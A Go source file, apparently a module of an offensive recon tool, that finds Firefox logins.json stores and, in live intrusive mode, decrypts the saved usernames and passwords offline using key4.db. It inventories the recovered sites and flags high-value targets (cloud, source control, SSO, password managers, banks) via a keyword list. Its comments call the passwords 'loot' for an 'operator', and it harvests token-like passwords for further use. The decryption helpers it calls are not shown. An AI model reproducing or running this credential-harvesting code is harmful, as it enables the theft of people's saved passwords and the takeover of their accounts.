package modules

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"sort"
	"strings"

	"github.com/puck-security/geiger/internal/module"
	"github.com/puck-security/geiger/internal/parse"
	"github.com/puck-security/geiger/internal/recognize"
	"github.com/puck-security/geiger/internal/recon"
)

// Firefox saved logins (logins.json + key4.db). Unlike Chromium — whose values
// are wrapped by an OS keychain key and can only be read in-process — Firefox's
// key is derivable from key4.db alone when no primary password is set, so the
// logins decrypt OFFLINE from the on-disk files. geiger recognizes the store,
// and under --live --intrusive decrypts and re-triages each recovered password.

func init() {
	module.Register(firefoxLogins{})
	recognize.RegisterRecognizer(recognizeFirefox)
}

func recognizeFirefox(b parse.Blob, _ string, _ *module.Registry) []recognize.Match {
	if b.JSON == nil || !strings.Contains(b.Raw, "encryptedUsername") {
		return nil
	}
	arr, ok := b.JSON["logins"].([]any)
	if !ok || len(arr) == 0 {
		return nil
	}
	return []recognize.Match{{
		Module: "firefox_logins",
		Fields: module.Fields{"source": b.File, "count": itoaSS(len(arr))},
		Label:  "firefox logins.json",
	}}
}

type firefoxLogins struct{ module.Base }

func (firefoxLogins) Name() string { return "firefox_logins" }

func (firefoxLogins) Recon(_ context.Context, c *recon.Client, _ module.Token, f module.Fields) ([]module.Finding, error) {
	out := []module.Finding{{Key: "saved logins", Value: f["count"] + " entries in logins.json", Flag: module.FlagInfo}}
	if !c.Live() || !c.Intrusive() {
		out = append(out, module.Finding{Key: "decrypt",
			Value: "Firefox stores the key in key4.db — when no primary password is set, these decrypt offline; read them with --live --intrusive",
			Flag:  cantFlag})
		return out, nil
	}
	logins, key, err := firefoxRecover(f["source"])
	if err != nil {
		out = append(out, module.Finding{Key: "decrypt", Value: "not decrypted: " + err.Error(), Flag: cantFlag})
		return out, nil
	}
	n := 0
	seen := map[string]bool{}
	var hosts []string
	for _, lg := range logins {
		if _, perr := decryptFirefoxLogin(key, lg.encPassword); perr != nil {
			continue
		}
		n++
		if h := loginHost(lg.host); h != "" && !seen[h] {
			seen[h] = true
			hosts = append(hosts, h)
		}
	}
	sort.Strings(hosts)
	out = append(out, module.Finding{Key: "recovered",
		Value:  itoaSS(n) + " saved logins decrypted offline (no primary password) — plaintext passwords readable",
		Flag:   fmFlag,
		Detail: hostDetail(hosts)}) // the recovered sites, expanded under -v / in JSON
	if sens := sensitiveHosts(hosts); len(sens) > 0 {
		out = append(out, module.Finding{Key: "high-value",
			Value: "logins for " + strings.Join(sens, ", "),
			Flag:  module.FlagWarn})
	}
	return out, nil
}

func (firefoxLogins) Summarize(title string, fs []module.Finding) module.Note {
	return module.Note{Title: title, Findings: fs, Summary: "Firefox saved logins — offline-decryptable on-disk store"}
}

func (firefoxLogins) Harvest(_ context.Context, c *recon.Client, _ module.Token, f module.Fields) ([]module.Harvested, error) {
	if !c.Live() || !c.Intrusive() {
		return nil, nil
	}
	logins, key, err := firefoxRecover(f["source"])
	if err != nil {
		return nil, nil
	}
	var out []module.Harvested
	for _, lg := range logins {
		pw, perr := decryptFirefoxLogin(key, lg.encPassword)
		// Only re-triage saved values that look like real provider tokens (an API
		// key someone pasted into a password field). Ordinary web passwords are the
		// loot itself — they're inventoried in Recon, not fed back through recon as
		// generic_secret noise the operator then can't place.
		if perr != nil || !hasStrongCredPrefix(pw) {
			continue
		}
		user, _ := decryptFirefoxLogin(key, lg.encUsername)
		out = append(out, module.Harvested{Label: "firefox:" + loginHost(lg.host) + "/" + user, Value: pw})
		if len(out) >= 50 {
			break
		}
	}
	return out, nil
}

// loginHost normalizes a logins.json origin ("https://github.com:443") to a bare
// host ("github.com") for the recovered-site inventory.
func loginHost(h string) string {
	h = strings.TrimSpace(h)
	if i := strings.Index(h, "://"); i >= 0 {
		h = h[i+3:]
	}
	if i := strings.IndexAny(h, "/:"); i >= 0 {
		h = h[:i]
	}
	return h
}

// hostDetail caps the recovered-site list so a profile with hundreds of logins
// doesn't dump an unbounded block under -v.
func hostDetail(hosts []string) []string {
	const max = 50
	if len(hosts) <= max {
		return hosts
	}
	out := append([]string{}, hosts[:max]...)
	return append(out, "+"+itoaSS(len(hosts)-max)+" more sites")
}

// sensitiveHostKW flags recovered logins worth surfacing even without -v: cloud,
// source control, SSO/IdP, and money.
var sensitiveHostKW = []string{
	"aws", "amazon", "google", "gcp", "azure", "microsoftonline", "okta", "onelogin",
	"github", "gitlab", "bitbucket", "cloudflare", "digitalocean", "heroku",
	"paypal", "stripe", "coinbase", "bank", "1password", "lastpass", "bitwarden", "vault",
}

func sensitiveHosts(hosts []string) []string {
	var hits []string
	for _, h := range hosts {
		l := strings.ToLower(h)
		for _, kw := range sensitiveHostKW {
			if strings.Contains(l, kw) {
				hits = append(hits, h)
				break
			}
		}
		if len(hits) >= 6 {
			break
		}
	}
	return hits
}

type fxLogin struct{ host, encUsername, encPassword string }

// firefoxRecover reads logins.json (at source) + key4.db (alongside it) and
// returns the login entries plus the decrypted master key.
func firefoxRecover(source string) ([]fxLogin, []byte, error) {
	key, err := firefoxMasterKey(filepath.Join(filepath.Dir(source), "key4.db"))
	if err != nil {
		return nil, nil, err
	}
	data, err := os.ReadFile(source)
	if err != nil {
		return nil, nil, err
	}
	var parsed struct {
		Logins []struct {
			Hostname          string `json:"hostname"`
			EncryptedUsername string `json:"encryptedUsername"`
			EncryptedPassword string `json:"encryptedPassword"`
		} `json:"logins"`
	}
	if err := json.Unmarshal(data, &parsed); err != nil {
		return nil, nil, err
	}
	out := make([]fxLogin, 0, len(parsed.Logins))
	for _, l := range parsed.Logins {
		out = append(out, fxLogin{host: l.Hostname, encUsername: l.EncryptedUsername, encPassword: l.EncryptedPassword})
	}
	return out, key, nil
}
